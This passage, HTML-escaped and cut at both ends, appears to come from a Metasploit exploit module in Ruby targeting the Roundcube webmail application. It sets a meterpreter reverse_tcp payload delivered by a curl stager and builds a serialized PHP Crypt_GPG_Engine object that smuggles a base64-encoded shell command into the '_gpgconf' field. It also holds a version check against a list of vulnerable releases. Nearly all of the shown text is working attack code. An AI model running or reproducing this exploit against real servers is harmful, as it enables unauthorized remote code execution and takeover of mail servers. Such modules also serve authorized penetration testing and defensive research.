X64], &#x27;Type&#x27; =&gt; :windows_dropper, &#x27;CmdStagerFlavor&#x27; =&gt; [&#x27;curl&#x27;], &#x27;DefaultOptions&#x27; =&gt; &#123; &#x27;PAYLOAD&#x27; =&gt; &#x27;windows/x64/meterpreter/reverse_tcp&#x27; &#125; &#125; ] ], &#x27;DisclosureDate&#x27; =&gt; &#x27;2025-06-02&#x27;, &#x27;DefaultTarget&#x27; =&gt; 0 ) ) register_options( [ OptString.new(&#x27;USERNAME&#x27;, [ true, &#x27;Email User to login with&#x27;, &#x27;&#x27; ]), OptString.new(&#x27;PASSWORD&#x27;, [ true, &#x27;Password to login with&#x27;, &#x27;&#x27; ]), OptString.new(&#x27;TARGETURI&#x27;, [ true, &#x27;The URI of the Roundcube Application&#x27;, &#x27;/&#x27; ]), Opt::RPORT(9999) ] ) end class PhpPayloadBuilder def initialize(command) @encoded = Base64.strict_encode64(command) @gpgconf = %(echo &quot;#&#123;@encoded&#125;&quot;|base64 -d|sh;#) end def build len = @gpgconf.bytesize %(|O:16:&quot;Crypt_GPG_Engine&quot;:3:&#123;s:8:&quot;_process&quot;;b:0;s:8:&quot;_gpgconf&quot;;s:#&#123;len&#125;:&quot;#&#123;@gpgconf&#125;&quot;;s:8:&quot;_homedir&quot;;s:0:&quot;&quot;;&#125;;) end end def fetch_login_page res = send_request_cgi( &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path), &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;keep_cookies&#x27; =&gt; true, &#x27;vars_get&#x27; =&gt; &#123; &#x27;_task&#x27; =&gt; &#x27;login&#x27; &#125; ) fail_with(Failure::Unreachable, &quot;#&#123;peer&#125; - No response from web service&quot;) unless res fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Unexpected HTTP code #&#123;res.code&#125;&quot;) unless res.code == 200 res end def check res = fetch_login_page unless res.body =~ /&quot;rcversion&quot;\s*:\s*(\d+)/ fail_with(Failure::UnexpectedReply, &quot;#&#123;peer&#125; - Unable to extract version number&quot;) end version = Regexp.last_match(1) vprint_good(&quot;Extracted version: #&#123;version&#125;&quot;) vulnerable_versions = %w[ 10500 10501 10502 10503 10504 10505 10506 10507 10508 10509 10600 10601 10602 1060